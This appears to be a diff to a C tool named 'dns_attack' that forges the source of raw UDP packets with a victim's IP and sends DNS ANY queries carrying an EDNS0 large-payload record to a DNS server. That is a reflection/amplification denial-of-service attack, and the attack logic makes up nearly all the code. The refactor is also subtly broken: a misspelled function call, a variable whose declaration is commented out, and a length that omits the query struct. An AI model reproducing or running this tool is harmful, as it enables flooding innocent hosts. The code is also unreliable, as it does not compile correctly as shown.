@@ -68,25 +68,21 @@ struct query {
 };
 
 struct adt {
-	
 	u_int8_t name;
 	unsigned short type;
 	unsigned short payload;
 	unsigned short flag;
 	unsigned short zval;
 	unsigned short len;
-
 };
 
 void construct_dns_hdr(dnshdr* h) {
-    h -> id = htons(0x7419);
+    h -> id    = htons(0x7419);
     h -> flags = htons(0x0100);
-
-    h -> qcnt = htons(0x0001);
-    h -> acnt = htons(0x0000);
-
-    h -> auth = htons(0x0000);
-    h -> add  = htons(0x0001);
+    h -> qcnt  = htons(0x0001);
+    h -> acnt  = htons(0x0000);
+    h -> auth  = htons(0x0000);
+    h -> add   = htons(0x0001);
 }
 
 void construct_dns_query(char *qury, char* host) {
@@ -102,7 +98,17 @@ void construct_dns_query(char *qury, char* host) {
             poi++;
         }
     }
+    *qury++ = 0x00;
 }
+
+void construct_add_rec(struct adt *ad) {
+    ad -> name    = htons(0xcc);
+    ad -> type    = htons(0x29);
+    ad -> payload = htons(0x0200);
+    ad -> flag    = 0;
+    ad -> zval    = 0;
+    ad -> len     = 0;
+} 
 
 void construct_ip_hdr(struct iphdr *ip, int tot_len, char* source_ip, sockaddr_in addr) {
     ip -> version  = 4;
@@ -119,21 +125,21 @@ void construct_ip_hdr(struct iphdr *ip, int tot_len, char* source_ip, sockaddr_i
 }
 
 void construct_udp_hdr(udphdr *u, int udp_len, int source_port) {
-
     u -> source = htons(source_port);
-    u -> dest = htons(53);
-
-    u -> len   = htons(udp_len);
-    u -> check = 0;
+    u -> dest   = htons(53);
+    u -> len    = htons(udp_len);
+    u -> check  = 0;
 }
 
 /* Command
-
 $ ./dns_attack <Victim IP> <UDP Source Port> <DNS Server IP>
 
 */
 int main(int argc, char const *argv[]) {
     srand(time(NULL));
+
+
+    // ~~~~~~~~~~~~~~ DNS QUERY DATA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
 
     unsigned char dns_data[128];
     struct dnshdr *dns_hdr = (struct dnshdr*) &dns_data;
@@ -145,22 +151,24 @@ int main(int argc, char const *argv[]) {
     strcpy(dns_rcrd, (char*) DEFAUL_QUERY_NAME);
     construct_dns_query(dns_name , dns_rcrd);
 
+    int now_poi = 0;
     query *q;
-    q = (query*) &dns_data[sizeof(struct dnshdr) + (strlen((const char*) dns_name) + 1)];
+    now_poi = sizeof(struct dnshdr) + (strlen((const char*) dns_name) + 1);
+    q = (query*) &dns_data[now_poi];
     q -> qtype = htons(0x00ff); // any type of query
     q -> qclass = htons(0x1);
 
 	adt *adtp;
-	adtp = (adt*) &dns_data[sizeof(struct dnshdr) + (strlen((const char*) dns_name) + 1) + sizeof(struct query)];
-	adtp -> name = htons(0xcc);
-	adtp -> type = htons(0x29);
-	adtp -> payload = htons(0x0200);
-	adtp -> flag = 0;
-	adtp -> zval = 0;
-	adtp -> len = 0;
+    now_poi = now_poi + sizeof(struct query);
+	adtp = (adt*) &dns_data[now_poi];
+    constrct_add_rec(adtp);
+
+    int dns_data_len = sizeof(struct dnshdr) + strlen((const char*) dns_name) + 1 + sizeof(struct adt);
+
+    // ~~~~~~~~~~~~~~ DNS QUERY DATA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
 
 
-    // DNS IP setting
+    // IP setting
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
     addr.sin_port   = htons(80);
@@ -173,31 +181,25 @@ int main(int argc, char const *argv[]) {
     strcpy(source_ip, argv[1]);
 
     data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
-    memcpy(data, &dns_data, sizeof(dnshdr) + (strlen((const char*) dns_name)) + sizeof(query) + sizeof(adt));
+    memcpy(data, &dns_data, dns_data_len);
 
 
-
-    // struct pseudo_header psh;
     struct iphdr  *ip_header  = (struct iphdr* ) (datagram);
     struct udphdr *udp_header = (struct udphdr*) (datagram + sizeof(struct iphdr)); 
-	struct dnshdr *dns_header = (struct dnshdr*) (datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
     
-    int hdr_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dnshdr);
-    int tot_len = hdr_len + (strlen((const char*) dns_name)) + sizeof(query) + sizeof(adt);
-    
+    int tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + dns_data_len;
 	
 	// IP header
     construct_ip_hdr(ip_header, tot_len, source_ip, addr);
     ip_header -> check = checksum((unsigned short*) datagram, ip_header -> tot_len);
 
-	
 	// UDP header
-    int udp_len = 8 + sizeof(struct dnshdr) + (strlen((const char*) dns_name)) + sizeof(struct query) + sizeof(adt);
+    // int udp_len = 8 + dns_data_len;
+    int udp_data_len = sizeof(struct udphdr) + dns_data_len;
     construct_udp_hdr(udp_header, udp_len, atoi(argv[2]));
 
 
-
-    int tmp_len = sizeof(struct udphdr) + sizeof(struct dnshdr) + (strlen((const char*) dns_name)) + sizeof(query) + sizeof(adt);
+    int tmp_len = sizeof(struct udphdr) + dns_data_len;
 
     struct pshdr ps_hdr;
     ps_hdr.saddr = inet_addr(argv[1]);
@@ -206,13 +208,12 @@ int main(int argc, char const *argv[]) {
     ps_hdr.protocol = IPPROTO_UDP;
     ps_hdr.len = htons(tmp_len);
 
-    int siz = sizeof(struct pshdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + (strlen((const char*) dns_name)) + sizeof(query) + sizeof(adt);
+    int siz = sizeof(struct pshdr) + udp_data_len;
     psgram = (char*) malloc(siz);
 
     memcpy(psgram, (char*) &ps_hdr, sizeof(struct pshdr));
     memcpy(psgram + sizeof(struct pshdr), udp_header, tmp_len);
     
-
 	// UDP checksum
     udp_header -> check = checksum((unsigned short*) psgram, siz);
 
